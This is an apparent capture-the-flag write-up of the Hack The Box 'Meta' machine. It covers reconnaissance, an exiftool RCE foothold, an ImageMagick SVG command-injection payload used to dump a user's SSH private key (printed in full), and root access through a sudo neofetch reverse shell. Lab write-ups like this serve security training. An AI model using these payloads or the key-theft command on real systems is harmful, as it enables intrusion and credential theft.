![image](PWND/Meta.png)

# NMap 

nmap 10.10.11.140

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


## Digging Deeper
nmap -sC -sV 10.10.11.140 -o nmap/meta  -v -e tun0

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Foothold
![image](https://user-images.githubusercontent.com/129129988/228424954-b7846044-8d36-4ab7-8166-26e52b9133d0.png)

add the domain name to /etc/hosts file. 

![image](https://user-images.githubusercontent.com/129129988/228425011-eecd78a6-6a38-48ad-a542-c1b5443f79bc.png)

![image](https://user-images.githubusercontent.com/129129988/228425028-1f943fb2-2ebf-4d4b-91f3-7158b6f79ce1.png)

there is not much info 
using gobuster to fuzz dir. also lets check for vhosts

gobuster dir -u http://artcorp.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
got no useful results.

ffuf -u http://artcorp.htb/ -H "HOST: FUZZ.artcorp.htb" -w /usr/share/seclists/Discovery/DNS/subdomain
s-top1million-5000.txt -mc 200

![image](https://user-images.githubusercontent.com/129129988/228425067-5feb5886-5615-4ecf-acfb-adbb6147c1f8.png)

add dev01.artcorp.htb to your hosts file.

![image](https://user-images.githubusercontent.com/129129988/228425086-397244c9-71d8-4959-a733-7dd135f7a556.png)

Here is the website. We can see MetaView is in testing so lets explore that.

![image](https://user-images.githubusercontent.com/129129988/228425108-53ed10a0-60c5-449a-ae7a-9f57d98f2ccd.png)

Here we can upload an image 

![image](https://user-images.githubusercontent.com/129129988/228425440-024c0ce3-3e0e-4ef6-ae65-508cc0f1b7c6.png)

as you can see metaView is actually using exiftool to give us meta data. Lets try to find an exploit for exiftool. 

https://www.google.com/search?client=firefox-b-1-e&q=exiftool+exploit
![image](https://user-images.githubusercontent.com/129129988/228425464-4f7c88e4-ffa4-419a-9788-692c0d71e970.png)

Here is a great link on how it works.
https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/

First lets clone the github repo and install the requirments.

git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
apt install djvulibre-bin exiftool

Now lets edit the exploit.py with our tun0 IP and port. 

![image](https://user-images.githubusercontent.com/129129988/228425501-1d02fa7c-74b9-4e7b-a398-037f5ad676db.png)

After saving your exploit.py we are ready to begin. 

![image](https://user-images.githubusercontent.com/129129988/228425554-f1f67940-b95c-4a2d-9678-87d2654a0b2c.png)

You will have a file called image.jpg, The script saved the old one and image.jpg_original. 

Start a nc listener. 

![image](https://user-images.githubusercontent.com/129129988/228425572-5b4ca319-f77b-489e-b522-51b31b3c359e.png)

I chose port 9890

Now choose the image file and upload. 

![image](https://user-images.githubusercontent.com/129129988/228425596-1447675d-4326-413f-9eb3-73b5762ff2ca.png)

Great Now we have a shell. 

![image](https://user-images.githubusercontent.com/129129988/228425612-8e40d54b-1391-4a78-884a-7ba34bbef424.png)

Once you have the shell upgraded 

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

![image](https://user-images.githubusercontent.com/129129988/228425631-9deacc8b-354f-476c-b2a1-f99f59af4ace.png)

we can see that we have a user named thomas but we dont have permissions to that user. I decided to do more enum using pspy64 transfer it to the machine and run it.
 
![image](https://user-images.githubusercontent.com/129129988/228425667-2c7e77d4-5e59-4486-ba57-8ce764fc9d5c.png)

there seems to be an image converter file, and it is using

$ cat /usr/local/bin/convert_images.sh 
#!/bin/bash 
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null 
pkill mogrify
 
looking online for image commang injections i found this website 
https://insert-script.blogspot.com/

```
poc.svg:
<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
Here is the code i used i modifred the echo command with /dev/shm/0wned

![image](https://user-images.githubusercontent.com/129129988/228425801-6d36ce3b-e9e5-4785-be5d-0be2128037c5.png)

creat this file in your machine and start a web server 

python3 -m http.server 9989
download this file to /dev/shm folder
now copy the file to /var/www/dev01.artcorp.htb/convert_images/

and now wait for your command to execute. You should now see a 0wned file in /dev/shm

1. Download the poc.svg file from your machine to host.

![image](https://user-images.githubusercontent.com/129129988/228425866-60cf80fe-aca9-40df-8fb2-0dab47a86ea1.png)

2. Copy the file to location where the file will be executed.
cp poc.svg /var/www/dev01.artcorp.htb/convert_images/

3. Wait for svg to execute

![image](https://user-images.githubusercontent.com/129129988/228425996-9332873b-a95c-4df7-9c4e-80191f4ddf4e.png)

![image](https://user-images.githubusercontent.com/129129988/228426011-1ef97fd2-e3ab-45ed-ab8b-5237e7e3ffcf.png)

![image](https://user-images.githubusercontent.com/129129988/228426019-7c8c4217-af0f-4533-bf75-f24cb012ebbf.png)
  
Now that we have confirmed this is working we can try to get a reverse shell of get .ssh key.

<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa)> /dev/shm/test`;"'>

ssh for thomas 

  ```
-----BEGIN OPENSSH PRIVATE KEY-----
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
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----
```
  
chmod 600 id_rsa 

ssh thomas@artcorp.htb -i id_rsa

  ![image](https://user-images.githubusercontent.com/129129988/228426129-45371647-ad8e-4c8f-a589-7b73580ab62e.png)


# Root Priv Esc 

Now that we are thomas we can first check for sudo commands we can run. 
sudo -l gives us a hint 

![image](https://user-images.githubusercontent.com/129129988/228426379-92aafd74-c785-4b7a-b7f1-1f43778a0684.png)

we can run commands with sudo permissions on neofetch a quick search on google and we can see that gtfo bins has neofetch 
https://gtfobins.github.io/gtfobins/neofetch/

Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
LFILE=file_to_read
sudo neofetch --ascii $LFILE    

Doing a little more digging i found config file for neofetch inside the home directory. 
We can add a rev shell into this config file on the top of it. 

![image](https://user-images.githubusercontent.com/129129988/228426416-6c7f37ef-e2df-460d-a003-afc357973f28.png)
  
make sure to set the correct env. 
export XDG_CONFIG_HOME="$HOME/.config"
setup nc listener

now run command with sudo.
![image](https://user-images.githubusercontent.com/129129988/228426462-514c2718-0d70-4a53-a85f-638023778b11.png)
![image](https://user-images.githubusercontent.com/129129988/228426479-0874dc2f-9c56-4dac-a543-d5b0cf601201.png)

We are Root. 
